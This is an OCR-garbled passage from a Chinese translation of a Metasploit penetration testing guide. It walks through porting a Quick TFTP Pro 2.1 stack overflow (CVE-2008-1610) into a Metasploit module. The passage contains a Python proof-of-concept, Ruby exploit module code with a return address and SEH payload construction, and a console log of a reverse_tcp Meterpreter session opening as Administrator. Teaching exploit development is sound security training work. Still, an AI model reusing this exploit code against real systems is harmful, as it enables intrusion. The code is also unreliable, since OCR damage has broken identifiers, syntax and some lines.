#TestedonWindowsXP SP2.
#Coded by Mati Aharoni
# muts..at..offensive-security.com
#http://www.offensive-security.com/oday/quick-tftp-poc.py.txt
技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技技
importsocket
import sys
226
---
## Page 254
第15章将渗透代码移植到Metasploit框架
")  H  0   [* 
-
host='127.0.0.1
port=69
try:
S=Socket.socket(socket.AF_INET，Socket.SOCK_DGRAM)
except:
print "socket() failed"
sys.exit(1)
filename = "pwnd"
shell="\xcc"*317
print "[*] Sending evil packet, ph33r"
s.sendto(muha,(host,port))
print "[*]Check port 4444 for bindshel1"
好比我们在之前的JMPESP缓冲区溢出案例中所做的那样，首先使用一个之前用过的渗透
攻击模块代码文件，为我们新的模块创建出一个骨架。
require‘msf/core
class Metasploit3'Quick TFTP Pro 2.1 Long Mode Buffer Overflow',
'Description'
}b%'Your Name',
'Version'
=>'$Revision:7724 $'
'References'
=>
['CVE'，'2008-1610'],
['OSVDB'，‘
'43784']，
['URL'，'http://www.exploit-db.com/exploits/5315'],
'Defaultoptions′ =>
{
'EXITFUNC'=>'thread'，
}，
227
---
## Page 255
Metasploit渗透测试指南
'Payload'
=>
{
'Space'
=>412,
'BadChars′=>"\x00\x20\x0a\x0d"，
'StackAdjustment'=>-3500，
'Platform'
=>'win',
'Targets'
=>
[
[‘Windows XP SP2',
{'Ret'=>0x41414141}]，
],
'Privileged'
=> true,
'DefaultTarget'
=>0，
'DisclosureDate′=>'Mar32008'))
register_options([Opt::RPORT(69)], self.class)
end
def exploit
connect_udp
print_status("Trying target #{target.name}..")
@udp_sock.put(sploit)
disconnect_udp
end
end
因为这个渗透代码使用了TFTP协议，需要引用Msf:Exploit:Remote:UdpmixinO，并且
因为它需要操纵SEH，因此也需要引I用Msf:Exploit:Remote:Sehmixin9来访问SEH溢出的一
些特定函数。TFTP通常在UDP的69端口上进行监听，我们声明这个端口作为该渗透攻击模块
的默认配置选项③。最后，一旦邪恶的攻击字符串生成之后，渗透代码将其发送到网络上。
我们开始使用TFTP原始Python渗透代码中的骨架代码来构建我们的邪恶攻击字符串，并
将其添加到渗透攻击代码区中。
def exploit
connect_udp
print_status("Trying target #{target.name}...")
evil="\x41"*1019
Oevil
[
0[“Windows XP SP2'，{'Ret′=>0x74d31458}］，#p/p/r oledlg
],
现在以WindowsXPSP2作为目标，返回地址为0x74d314580，接下来我们动态生成一个
1,019字节长的大写字母随机化字符串。
evil =rand_text_alpha_upper(1019)
evil( use exploit/windows/tftp/quicktftp_book
msf exploit(quicktftp_book) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(quicktftp_book)> setLH0ST 192.168.1.101
LHOST => 192.168.1.101
msf exploit(quicktftp_book) > set RH0ST 192.168.1.155
RHOST => 192.168.1.155
msf exploit(quicktftp_book)> exploit
[*] Started reverse handler on 192.168.1.101:4444
[*] Trying target Windows XP SP2...
[*]Sending stage (747008 bytes)
[*] Meterpreter session 2 opened (192.168.1.101:4444 -> 192.168.1.155:1036)
meterpreter>getuid
Serverusername:V-XP-SP2-BARE\Administrator
到了Metasploit框架中！
require'msf/core
classMetasploit3'Quick TFTP Pro 2.1 Long Mode Buffer Overflow'
'Description'
=>%q{
This module exploits a stack overflow in Quick TFTP Pro 2.1.
231
---
## Page 259
Metaspioit渗透测试指南
'Author'
=> 'Your Name',
'Version'
=>*$Revision: 7724 $',
'References'
=>
[
['CVE'，'2008-1610'],
['OSVDB'，‘43784'],
['URL'，'http://www.exploit-db.com/exploits/5315'],
],
'DefaultOptions'
=>
{
‘EXITFUNC'=>'thread'，
.peot
{
'Space'
=>412,
'BadChars′=>"\x00\x20\x0a\x0d"，
StackAdjustment'=>-3500,
'Platform
=>'win',
'Targets'
=>
]
['Windows XP SP2',
{'Ret'=>0x74d31458}]，
# p/p/r oledlg
]，
'Privileged'
=>true,
'DefaultTarget'
'DisclosureDate′ =>‘Mar 3 2008'))
register_options([Opt::RPORT(69)],self.class)
end
defexploit
connect_udp
print_status("Trying target #{target.name}...")
evil = rand_text_alpha_upper(1019)
evil << generate_seh_payload(target.ret)
evil << make_nops(16)
sploit ="\x00\x02"
sploit<<"pwnd"
sploit<<"\xo0"
sploit<<evil